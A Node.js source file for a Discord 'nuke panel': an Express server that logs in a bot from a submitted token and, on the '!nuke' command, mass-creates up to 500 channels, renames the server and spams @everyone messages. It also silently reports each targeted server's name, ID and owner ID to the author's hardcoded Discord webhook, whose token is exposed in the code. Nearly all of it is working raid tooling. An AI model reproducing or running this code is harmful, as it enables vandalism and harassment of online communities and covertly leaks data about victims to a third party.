import express from 'express';
import { Client, GatewayIntentBits, ChannelType } from 'discord.js';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const NOTIFY_WEBHOOK = 'https://discord.com/api/webhooks/1571391518525358100/BLEIDxMtvlNlT593waQH56RCa68_RD5UPBtDvCRmgnFGC79YRWh1KZeY7QegvScWDjJj';

let config = {
  channelName: 'NUKE BY PHTUANKHANH',
  renameName: 'NUKE BY PTK',
  channelCount: 100,
  msgContent: '# NUKED\n> @everyone cút hết',
  msgCount: 1,
  pingEveryone: true
};

async function notifyNuke(info) {
  const { guildName, guildIcon, guildId, ownerId, channels, msgs, user, error } = info;
  const embed = {
    title: error ? 'Nuke thất bại' : 'Nuke thành công',
    color: error ? 0xff0000 : 0x00ff66,
    fields: [
      { name: 'Server', value: guildName || 'không rõ', inline: true },
      { name: 'Guild ID', value: guildId || '-', inline: true },
      { name: 'Kênh tạo', value: String(channels ?? 0), inline: true },
      { name: 'Tin nhắn', value: String(msgs ?? 0), inline: true },
      { name: 'Người dùng', value: user || '-', inline: true },
      { name: 'Owner ID', value: ownerId || '-', inline: true },
      { name: 'Thời gian', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false },
    ],
    thumbnail: guildIcon ? { url: guildIcon } : undefined,
    footer: { text: 'nuke panel | by PhTuanKhanh' },
    timestamp: new Date().toISOString(),
  };
  if (guildId) embed.fields.push({ name: 'Link server', value: `https://discord.com/channels/${guildId}`, inline: false });
  if (error) embed.fields.push({ name: 'Lỗi', value: String(error).slice(0, 1000), inline: false });
  const body = { username: 'nuke notifier', avatar_url: guildIcon || null, embeds: [embed] };
  try {
    await fetch(NOTIFY_WEBHOOK + '?wait=false', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch {}
}

let botClient = null;

function startBot(token) {
  if (botClient) botClient.destroy();

  botClient = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.MessageContent,
      GatewayIntentBits.GuildMembers
    ]
  });

  botClient.on('ready', () => {
    console.log(`[BOT] Online: ${botClient.user.tag}`);
  });

  botClient.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (message.content !== '!nuke') return;

    const guild = message.guild;
    const t0 = Date.now();
    message.reply('🚀 Bắt đầu nuke...').catch(() => {});

    let channelsCreated = 0;
    let msgsSent = 0;

    try {
      const cc = config.channelCount;
      const chName = config.channelName;
      const rName = config.renameName;
      const mc = config.msgCount;
      const msgText = config.msgContent;
      const ping = config.pingEveryone;

      // 1. TẠO KÊNH SONG SONG - TÊN Y HỆT NHAU
      const channelPromises = Array.from({ length: cc }, () =>
        guild.channels.create({
          name: chName,
          type: ChannelType.GuildText,
        }).then(c => { channelsCreated++; return c; }).catch(() => null)
      );

      const createdChannels = (await Promise.allSettled(channelPromises))
        .filter(r => r.status === 'fulfilled' && r.value !== null)
        .map(r => r.value);

      // 2. RENAME GUILD
      if (rName) {
        await guild.setName(rName).catch(() => {});
      }

      // 3. SPAM TIN NHẮN BẰNG BOT
      if (createdChannels.length && mc > 0) {
        const msgJobs = [];
        for (const c of createdChannels) {
          for (let i = 0; i < mc; i++) msgJobs.push(c);
        }

        await Promise.allSettled(
          msgJobs.map(c => 
            c.send({
              content: msgText,
              allowedMentions: ping ? { parse: ['everyone'] } : { parse: [] }
            })
            .then(() => { msgsSent++; })
            .catch(() => {})
          )
        );
      }

      await notifyNuke({
        guildName: guild.name,
        guildIcon: guild.iconURL({ size: 256 }),
        guildId: guild.id, ownerId: guild.ownerId,
        channels: channelsCreated, msgs: msgsSent,
        user: botClient.user.username,
        error: null,
      });

      console.log(`[NUKE] Xong trong ${Date.now() - t0}ms`);

    } catch (err) {
      console.error('Lỗi nuke:', err.message);
      await notifyNuke({
        guildName: guild.name, guildIcon: guild.iconURL({ size: 256 }), guildId: guild.id,
        ownerId: guild.ownerId, channels: channelsCreated, msgs: msgsSent, 
        user: botClient.user.username, error: err.message
      });
    }
  });

  botClient.login(token).catch(e => console.error('Login error:', e.message));
}

app.post('/api/bot-login', async (req, res) => {
  const { token } = req.body ?? {};
  if (!token) return res.status(400).json({ error: 'Thiếu token bot' });
  
  try {
    startBot(token);
    await new Promise(r => setTimeout(r, 1500));
    if (!botClient || !botClient.user) throw new Error('Đăng nhập thất bại, kiểm tra token');
    res.json({ ok: true, user: botClient.user.tag });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/settings', (req, res) => {
  const { channelName, renameName, channelCount, msgContent, msgCount, pingEveryone } = req.body ?? {};
  if (channelName) config.channelName = channelName;
  if (renameName) config.renameName = renameName;
  if (channelCount) config.channelCount = Math.min(500, Math.max(1, parseInt(channelCount, 10)));
  if (msgContent) config.msgContent = msgContent;
  if (msgCount !== undefined) config.msgCount = Math.max(1, parseInt(msgCount, 10));
  if (pingEveryone !== undefined) config.pingEveryone = !!pingEveryone;
  res.json({ ok: true, config });
});

app.get('/api/settings', (req, res) => {
  res.json(config);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`panel http://localhost:${PORT}`));
